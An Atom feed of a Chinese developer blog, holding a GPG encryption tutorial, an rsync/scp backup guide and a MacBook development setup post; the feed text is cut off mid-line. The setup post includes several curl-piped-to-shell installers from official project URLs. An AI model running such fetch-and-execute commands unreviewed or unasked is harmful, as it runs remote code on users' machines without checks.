<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jiahao Luo</title>
  
  <subtitle>Blockchain and Program Language</subtitle>
  <link href="https://www.blog-blockchain.xyz/atom.xml" rel="self"/>
  
  <link href="https://www.blog-blockchain.xyz/"/>
  <updated>2024-11-18T09:44:36.112Z</updated>
  <id>https://www.blog-blockchain.xyz/</id>
  
  <author>
    <name>Michael(Jiahao) Luo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安全加密实践-GPG</title>
    <link href="https://www.blog-blockchain.xyz/dev/crypto-practice/"/>
    <id>https://www.blog-blockchain.xyz/dev/crypto-practice/</id>
    <published>2024-11-18T09:28:20.000Z</published>
    <updated>2024-11-18T09:44:36.112Z</updated>
    
    <content type="html"><![CDATA[<p>GPG 是一款强大的开源加密工具，基于公钥密码学原理，为电子通信提供隐私保护和数据验证。它广泛应用于确保信息安全和身份认证。</p><h1>安装指南</h1><h2 id="Linux-系统">Linux 系统</h2><p><strong>Debian/Ubuntu:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install gnupg</span><br></pre></td></tr></table></figure><p><strong>CentOS/RHEL:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum install gnupg</span><br></pre></td></tr></table></figure><p><strong>Fedora:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dnf install gnupg</span><br></pre></td></tr></table></figure><p><strong>Arch Linux:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S gnupg</span><br></pre></td></tr></table></figure><h2 id="macOS">macOS</h2><p>使用 <a href="https://brew.sh/">Homebrew</a> 安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install gnupg</span><br></pre></td></tr></table></figure><h2 id="Windows">Windows</h2><ul><li><ol><li>从 <a href="https://gpg4win.org/">Gpg4win 官方网站</a> 下载安装包 2. 运行安装程序，按提示完成安装 3. 安装后，在命令提示符或 PowerShell 中验证</li></ol></li></ul><h2 id="FreeBSD">FreeBSD</h2><p>通过 pkg 包管理器安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install gnupg</span><br></pre></td></tr></table></figure><h2 id="验证安装">验证安装</h2><p>在任何平台上，运行以下命令确认安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --version</span><br></pre></td></tr></table></figure><p>如果显示版本信息和支持的加密算法，则表示安装成功。</p><h1>密钥管理</h1><h2 id="生成密钥对"><strong>生成密钥对</strong></h2><p>首先需要生成自己的公钥和私钥（如果尚未生成）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">复制代码</span><br><span class="line">gpg --full-generate-key</span><br></pre></td></tr></table></figure><ul><li>按提示选择：<ol><li>密钥类型：选择 <code>(1)</code> RSA and RSA。</li><li>密钥长度：一般选择 <code>2048</code> 或 <code>4096</code>。</li><li>密钥有效期：设置为 <code>0</code>（永不过期）或指定期限。</li><li>输入姓名和电子邮件：用于标识密钥。</li><li>设置密码：保护私钥安全。</li></ol></li></ul><h2 id="查看密钥">查看密钥</h2><p>列出所有公钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --list-keys</span><br></pre></td></tr></table></figure><p>列出所有私钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --list-secret-keys</span><br></pre></td></tr></table></figure><p>这些命令将显示你系统中的所有公钥和私钥，包括密钥 ID、用户 ID 和创建日期等信息。</p><h2 id="导入私钥或者公钥"><strong>导入私钥或者公钥</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg --import privatekey.asc</span><br><span class="line">gpg --import publickey.asc</span><br></pre></td></tr></table></figure><p>导入他人的公钥时会包括与该公钥关联的用户名和邮箱地址。这些信息是公钥的一部分，用于识别公钥的所有者。</p><h2 id="导出公钥">导出公钥</h2><p>要与他人共享你的公钥，可以导出它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --<span class="built_in">export</span> --armor your_email@example.com(或者uid) &gt; public_key.asc</span><br></pre></td></tr></table></figure><p>这将创建一个名为 public_key.asc 的 ASCII 格式文件，包含你的公钥。 <code>--armor</code> 选项将输出转换为 ASCII 编码的“装甲格式”（Armored format）。没有这个选项，默认是二进制。<code>.asc</code> 是一种文件扩展名，表示文件以 <strong>ASCII 装甲格式（ASCII Armored Format）</strong> 存储的数据。它通常用于 <strong>GPG 加密或签名的密钥、签名或加密文件</strong>。</p><h2 id="导出私钥">导出私钥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --export-secret-keys --armor &lt;your_email&gt; &gt; privatekey.asc</span><br></pre></td></tr></table></figure><h2 id="删除私钥或者公钥">删除私钥或者公钥</h2><p>删除公钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --delete-keys &lt;key_id&gt;</span><br></pre></td></tr></table></figure><p>删除私钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --delete-secret-keys &lt;key_id&gt;</span><br></pre></td></tr></table></figure><h2 id="验证公钥指纹">验证公钥指纹</h2><p>通过哈希算法计算公钥的唯一标识符，验证密钥的真实性和来源。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gpg --fingerprint &lt;key_id&gt;</span><br><span class="line">pub   rsa4096 2022-01-01 [SC]</span><br><span class="line">      A1B2 C3D4 E5F6 1234 5678 90AB CDEF 1234 5678 9ABC</span><br><span class="line">uid           [ultimate] Alice &lt;alice@example.com&gt;</span><br><span class="line">sub   rsa4096 2022-01-01 [E]</span><br></pre></td></tr></table></figure><h1>加密和解密</h1><h2 id="加密文件"><strong>加密文件</strong></h2><p>使用接收方的公钥加密文件。例如，将文件 example.txt 加密为 example.txt.gpg：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --output example.txt.gpg --encrypt --recipient &lt;recipient_email&gt; example.txt</span><br></pre></td></tr></table></figure><p><strong>gpg 使用混合加密</strong>，在混合加密过程中，gpg 会自动生成一个随机的、一次性的对称密钥。</p><p><strong>加密过程</strong>：gpg 用生成的对称密钥加密文件内容，然后用接收方的公钥对该对称密钥进行加密，并将其存储在最终输出文件中。</p><p><strong>解密过程</strong>：先用自己的私钥解密文件中存储的对称密钥。再用解密出的对称密钥解密文件内容。</p><p>所以说可以<strong>直接加密大文件</strong>。如果文件特别大，可以使用 <code>split</code> 先把文件分割，再每块加密。</p><p><strong>加密文件夹</strong>：GPG 不直接支持加密整个文件夹，但您可以先将文件夹压缩，然后加密压缩文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -czf folder.tar.gz folder/</span><br><span class="line">gpg --output folder.tar.gz.gpg --encrypt --recipient  &lt;recipient_email&gt; folder.tar.gz</span><br></pre></td></tr></table></figure><p>如果有<strong>多个接收方</strong>，就多个 <code>--recipient  &lt;recipient_email&gt;</code> 即可。他们每人都能解密。</p><h2 id="解密文件">解密文件</h2><p>接收方使用私钥解密加密文件。例如，将 example.txt.gpg 解密为原文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --output example.txt --decrypt example.txt.gpg</span><br></pre></td></tr></table></figure><h1>签名</h1><h2 id="嵌入签名文件"><strong>嵌入签名文件</strong></h2><p>发送文件时，可以添加数字签名，以验证发送者身份和文件完整性。签名文件是二进制格式，包含签名和文件内容。<strong>生成一个嵌入签名文件（Attached Signature）</strong>， 签名数据与文件内容绑定在一起，输出的文件既包含原始文件内容，又包含签名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --output example.txt.sig --sign example.txt</span><br></pre></td></tr></table></figure><p>验证和分离的方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --output example.txt --decrypt example.txt.sig</span><br></pre></td></tr></table></figure><h2 id="分离签名文件"><strong>分离签名文件</strong></h2><p>签名独立存储在一个单独的 .sig 文件中，原始文件 file.txt 不会被修改。通常用于需要保持原始文件完整性、不想嵌入签名的场景（如软件分发）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --output file.sig --detach-sign file.txt</span><br></pre></td></tr></table></figure><p>验证方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --verify file.sig file.txt</span><br></pre></td></tr></table></figure><h2 id="加密并签名文件"><strong>加密并签名文件</strong></h2><p>用自己的私钥签名，对方的公钥加密。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --output encrypted_signed_file.gpg --encrypt --sign --recipient &lt;recipient_email&gt; file.txt</span><br></pre></td></tr></table></figure><p>解密流程和普通的解密是完全一致的。</p><h2 id="查看文件是否带有签名">查看文件是否带有签名</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --list-packets file.gpg</span><br></pre></td></tr></table></figure><h1><strong>对称加密（无需公钥，简单加密）</strong></h1><p>加密：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --output example.txt.gpg --symmetric example.txt</span><br></pre></td></tr></table></figure><p>解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --output example.txt --decrypt example.txt.gpg</span><br></pre></td></tr></table></figure><p>在解密时，gpg 会自动检测文件的加密类型。它会查看加密文件的头部信息，其中包含了使用的加密方法（对称或非对称）。这种设计使得 gpg 可以灵活地处理不同类型的加密文件，而无需用户明确指定加密类型。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;GPG 是一款强大的开源加密工具，基于公钥密码学原理，为电子通信提供隐私保护和数据验证。它广泛应用于确保信息安全和身份认证</summary>
        
      
    
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/categories/developer/"/>
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/tags/developer/"/>
    
  </entry>
  
  <entry>
    <title>传输和备份实践</title>
    <link href="https://www.blog-blockchain.xyz/dev/backup-practice/"/>
    <id>https://www.blog-blockchain.xyz/dev/backup-practice/</id>
    <published>2024-11-18T09:26:20.000Z</published>
    <updated>2024-11-18T09:44:33.646Z</updated>
    
    <content type="html"><![CDATA[<h1>rsync</h1><p>rsync 是一个强大的文件同步和传输工具，适用于类 Unix 系统。Windows 用户可以通过 WSL（Windows Subsystem for Linux）来使用 rsync。以下是详细的安装和使用方法：</p><p>Ubuntu/Debian：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install rsync</span><br></pre></td></tr></table></figure><p>CentOS/Fedora：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum install rsync</span><br></pre></td></tr></table></figure><p>macOS（使用 Homebrew）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install rsync</span><br></pre></td></tr></table></figure><p>注意，两台机器都要安装好。</p><p><strong>使用方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync [选项] 源目录/ 目标目录</span><br></pre></td></tr></table></figure><ul><li>-a：归档模式，保留所有文件属性</li><li>-v：详细输出</li><li>-z：压缩传输</li><li>-P：显示进度并允许断点续传</li><li>–delete：删除目标目录中源目录没有的文件</li><li>-h：以人类可读的格式显示文件大小</li><li>-e：指定要使用的远程 shell，通常用于指定 SSH 连接参数</li></ul><p>本地同步：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avzP /path/to/source/ /path/to/destination/</span><br></pre></td></tr></table></figure><p>远程同步（将本地文件同步到远程服务器）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avzP /path/to/local/ user@remote_host:/path/to/destination/</span><br></pre></td></tr></table></figure><p>远程同步（将远程文件同步到本地）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avzP user@remote_host:/path/to/remote/ /path/to/local/</span><br></pre></td></tr></table></figure><p>使用 SSH 密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avzP -e <span class="string">&quot;ssh -i /path/to/private_key -p PORT&quot;</span> /path/to/local/ user@remote_host:/path/to/destination/</span><br></pre></td></tr></table></figure><p>注意：使用 rsync 时，源目录路径后的斜杠 “/” 很重要。如果加上斜杠，rsync 会复制目录中的内容；如果不加斜杠，rsync 会复制整个目录。</p><h1>SCP</h1><p>SCP（Secure Copy Protocol）是一种基于 SSH 协议的文件传输工具，用于在本地主机和远程主机之间安全地复制文件。相比 rsync，SCP 有以下特点：</p><ul><li><strong>简单易用：</strong> SCP 的语法相对简单，适合快速的文件传输操作。</li><li><strong>安全性：</strong> SCP 使用 SSH 协议进行加密传输，确保数据在传输过程中的安全性。</li><li><strong>广泛支持：</strong> 无需在远程主机上安装额外软件，windows 也会自带，不像 rsync 只能在类 unix 系统中使用。</li><li><strong>单次传输：</strong> SCP 主要用于一次性文件传输，<strong>不支持增量同步</strong>。</li></ul><p>相比 rsync 的优缺点：</p><p>SCP 基本用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从本地复制到远程</span></span><br><span class="line">scp /path/to/local/file user@remote_host:/path/to/remote/directory</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从远程复制到本地</span></span><br><span class="line">scp user@remote_host:/path/to/remote/file /path/to/local/directory</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制整个目录（使用 -r 选项）</span></span><br><span class="line">scp -r /path/to/local/directory user@remote_host:/path/to/remote/directory</span><br></pre></td></tr></table></figure><p>总的来说，对于简单的文件传输任务，SCP 是一个不错的选择。但对于需要频繁同步或大量文件传输的场景，rsync 通常是更好的选择。</p><h1>加密备份</h1><p>以上的备份就足够大部分场景了，本地和远程都是可以的。但是有时候我们需要加密备份，比如说备份在硬盘中的文件，不希望被拾到的人看到内容，就需要加密备份。</p><p>最方便的还是 <a href="https://cryptomator.org/">cryptomator</a> ，能定义一个保险库，然后直接把保险库整个的备份就好。</p><p>随后随便怎么传输。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1&gt;rsync&lt;/h1&gt;
&lt;p&gt;rsync 是一个强大的文件同步和传输工具，适用于类 Unix 系统。Windows 用户可以通过 WSL（Windows Subsystem for Linux）来使用 rsync</summary>
        
      
    
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/categories/developer/"/>
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/tags/developer/"/>
    
  </entry>
  
  <entry>
    <title>macbook体验</title>
    <link href="https://www.blog-blockchain.xyz/dev/macbook/"/>
    <id>https://www.blog-blockchain.xyz/dev/macbook/</id>
    <published>2024-11-16T17:33:20.000Z</published>
    <updated>2024-11-18T09:44:47.920Z</updated>
    
    <content type="html"><![CDATA[<h1>为什么我喜欢 MacBook</h1><p>我喜欢 MacBook 有以下几个原因：</p><ul><li><strong>优秀的硬件质量：</strong> MacBook 以其出色的工艺和耐用性著称，铝制一体化机身既美观又坚固。</li><li><strong>休眠与唤醒的无缝体验：</strong> MacBook 合上盖子即可快速休眠，打开盖子能立即恢复工作状态，不会出现无法休眠或休眠后无法唤醒的问题，提供流畅、稳定的使用体验。</li><li><strong>长续航时间：</strong> MacBook 的电池续航能力一直是业界领先，特别是 M 系列芯片的推出更是大幅提升了续航表现。</li><li><strong>出色的显示屏：</strong> Retina 显示屏提供高分辨率和准确的色彩还原，非常适合设计和视频编辑工作。</li><li><strong>适合开发的 Unix 基础：</strong> macOS 基于 Unix，为开发者提供了强大的命令行工具和兼容性。</li><li><strong>丰富的软件生态系统：</strong> MacBook 拥有大量高质量的软件选择，包括众多开源项目和优秀的商业软件。特别是在编程领域，MacBook 提供了全面而强大的开发工具和环境支持，满足各种专业需求和日常应用。</li></ul><p>我最近购买了一台 MacBook Pro 14 英寸，配备 M4 Pro 处理器、48GB 内存和 512GB 存储，还买了三年的 AC+。以下是我选择这个配置的原因：</p><ul><li>48GB 内存：选择这么大的内存是为了确保长期使用（3 年以上）时系统仍能流畅运行。考虑到未来软件可能会更加耗费内存，24GB 可能在几年后显得不够用。</li><li>512GB 存储：我主要用于编程和文字处理，不会存储大量视频素材或游戏，因此 512GB 对我来说足够了。另外，我有 1TB 和 512GB 的外置 SSD 可以用于额外存储需求。实在不行，还可以去扩容硬盘到 4TB，但是可能影响系统稳定性。</li><li>14 英寸屏幕：选择 14 英寸而不是 16 英寸是因为我更喜欢便携性，而且公司已经配备了 16 英寸的 MacBook。14 英寸对于日常编码和文字工作来说非常合适。</li></ul><p>这个配置很好地平衡了性能、便携性和未来可扩展性，非常适合我的使用需求。</p><p>然而，MacBook 也存在一些不足之处，需要通过第三方软件来弥补：</p><ul><li><strong>截图功能有限：</strong> 无法进行长截图，需要使用如 CleanShot X 等第三方工具来增强截图功能。</li><li><strong>缺乏高级剪贴板功能：</strong> 系统自带的剪贴板功能较为基础，可以安装 Maccy 等工具来增强剪贴板管理能力。</li><li><strong>软件卸载不彻底：</strong> 有时卸载应用后可能会留下残余文件，可以使用 AppCleaner 等工具来确保彻底卸载。</li><li><strong>NTFS 文件系统支持有限：</strong> macOS 默认无法写入 NTFS 格式的硬盘，可以使用 Mounty 或 Paragon NTFS for Mac 等软件来解决这个问题。</li></ul><h2 id="小经验">小经验</h2><p>数据库等服务类，需要大量的配置和依赖裤的软件，建议使用 docker，便捷而且方便做数据隔离。<br>软件的安装推荐优先使用 homebrew，并且卸载也是。</p><h2 id="快捷键">快捷键</h2><p>窗口管理快捷键：</p><ul><li><strong>Command + H:</strong> 隐藏当前应用程序的窗口，对应用无任何影响。</li><li><strong>Command + M:</strong> 最小化当前窗口</li><li><strong>Command + W:</strong> 关闭当前窗口，但是一般不退出程序，而是关闭标签页。</li><li><strong>Command + Q:</strong> 退出当前应用程序</li><li><strong>Command + Tab:</strong> 在打开的应用程序之间切换</li><li><strong>Control + Command + F:</strong> 全屏显示当前窗口（如果应用程序支持）</li><li><strong>Command + `:</strong> 在同一应用程序的多个窗口之间切换</li><li><strong>Mission Control (F3 或 Control + 上箭头):</strong> 查看所有打开的窗口</li><li><strong>Command + Space:</strong> 打开 Spotlight 搜索</li><li>F5: 语音输入。</li><li><strong>Command + Option + D:</strong> 显示或隐藏 Dock。当需要大屏浏览的时候。但是用的不多，这时大多用全屏。</li><li><strong>Command + Option + Esc:</strong> 打开强制退出应用程序窗口</li></ul><p>文件处理：</p><ul><li><strong>Command + Shift + G:</strong> 在 Finder 中前往文件夹</li><li><strong>Command + Shift + N:</strong> 在 Finder 中新建文件夹</li><li><strong>Command + Delete:</strong> 将所选项目移到废纸篓</li><li><strong>Space:</strong> 在 Finder 中使用快速查看预览文件</li><li><strong>复制粘贴是类似的：Command + C，Command + V</strong></li><li><strong>剪贴复制，也就是移动文件：先复制，再 Command + Option + V</strong></li></ul><p>应用</p><ul><li><strong>Command + ,:</strong> 在大多数应用中打开偏好设置。</li><li><strong>Command + N:</strong> 在大多数应用中打开新窗口</li></ul><h2 id="开发软件">开发软件</h2><p>以下是一些常用的开发软件及其简介：</p><ul><li><strong>Oh My Zsh:</strong> Zsh 的配置管理框架，提供了丰富的主题和插件。</li><li><strong>Xcode:</strong> Apple 官方的集成开发环境，用于 iOS、macOS 等应用开发</li><li><strong>Homebrew:</strong> macOS 的包管理器，方便安装和管理各种开发工具</li><li><strong>iTerm2:</strong> 比默认终端更强大的终端模拟器</li><li><strong>Visual Studio Code:</strong> 轻量级但功能强大的代码编辑器</li><li><strong>Git:</strong> 版本控制系统，用于代码管理和协作</li><li><strong>IntelliJ IDEA 和 JetBrains Toolbox:</strong> 强大的集成开发环境，特别适用于 Java 开发，也支持多种其他编程语言</li><li><strong>Node.js:</strong> JavaScript 运行环境，用于前端和后端开发</li><li><strong>Docker Desktop:</strong> 容器化平台，用于应用程序的打包、部署和运行</li><li><strong>VMware Fusion Pro:</strong> 强大的虚拟化软件，允许在 Mac 上运行 Windows 和其他操作系统。现在对个人用户免费提供。(到官网下载)</li><li><strong>nvm (Node Version Manager):</strong> 用于管理多个 Node.js 版本的工具，允许开发者在不同项目中使用不同版本的 Node.js</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 Oh My Zsh</span></span><br><span class="line">brew install zsh</span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装常用插件</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 .zshrc 文件</span></span><br><span class="line">sed -i <span class="string">&#x27;&#x27;</span> <span class="string">&#x27;s/plugins=(git)/plugins=(git zsh-autosuggestions zsh-syntax-highlighting)/&#x27;</span> ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 zsh 设置为默认 shell</span></span><br><span class="line">chsh -s $(<span class="built_in">which</span> zsh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 应用更改</span></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Xcode</span></span><br><span class="line">xcode-select --install</span><br><span class="line"></span><br><span class="line"><span class="comment"># Homebrew</span></span><br><span class="line">/bin/bash -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># iTerm2</span></span><br><span class="line">brew install --cask iterm2</span><br><span class="line"></span><br><span class="line"><span class="comment"># Visual Studio Code</span></span><br><span class="line">brew install --cask visual-studio-code</span><br><span class="line"></span><br><span class="line"><span class="comment"># Git</span></span><br><span class="line">brew install git</span><br><span class="line"></span><br><span class="line"><span class="comment"># JetBrains Toolbox</span></span><br><span class="line">brew install --cask jetbrains-toolbox</span><br><span class="line">brew install --cask intellij-idea</span><br><span class="line"></span><br><span class="line"><span class="comment"># Node.js</span></span><br><span class="line">brew install node</span><br><span class="line"></span><br><span class="line"><span class="comment"># Docker Desktop</span></span><br><span class="line">brew install --cask docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># nvm，建议使用稳定版</span></span><br><span class="line">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash</span><br><span class="line">nvm install --lts</span><br></pre></td></tr></table></figure><p>不常用，但是我会用到的</p><ul><li><strong>Hexo:</strong> 一个快速、简洁且高效的博客框架，基于 Node.js。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</li><li><strong>Foundry:</strong> 一个用于以太坊智能合约开发、测试和部署的快速、可移植和模块化的工具包。它提供了一套完整的开发环境，包括编译器、测试框架和部署工具，使得智能合约开发更加高效和便捷。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hexo 博客</span></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"><span class="comment"># 安装 Foundry</span></span><br><span class="line">curl -L https://foundry.paradigm.xyz | bash</span><br><span class="line"><span class="built_in">source</span> ~/.zshenv</span><br><span class="line">foundryup</span><br></pre></td></tr></table></figure><h2 id="编程语言">编程语言</h2><ul><li><strong>Python:</strong> 使用 Homebrew 安装最新版本的 Python</li><li><strong>pyenv:</strong> Python 版本管理工具，用于在同一系统上管理多个 Python 版本</li><li><strong>poetry:</strong> Python 依赖管理和打包工具，简化项目依赖管理</li><li><strong>Rust:</strong> 系统级编程语言，注重安全性和并发性</li><li><strong>Go:</strong> Google 开发的编程语言，以简洁、高效和并发支持著称</li><li><strong>OpenJDK:</strong> Java 开发工具包的开源实现，提供了完整的 Java 运行时环境和开发工具</li><li><strong>Maven:</strong> Java 项目管理和构建自动化工具，简化了依赖管理和构建过程</li><li><strong>Gradle:</strong> 基于 Groovy 的构建自动化工具，提供了灵活的项目构建和依赖管理能力</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Python</span></span><br><span class="line">brew install python</span><br><span class="line"></span><br><span class="line"><span class="comment"># pyenv</span></span><br><span class="line">brew install pyenv</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;[[ -d $PYENV_ROOT/bin ]] &amp;&amp; export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;eval &quot;$(pyenv init -)&quot;&#x27;</span> 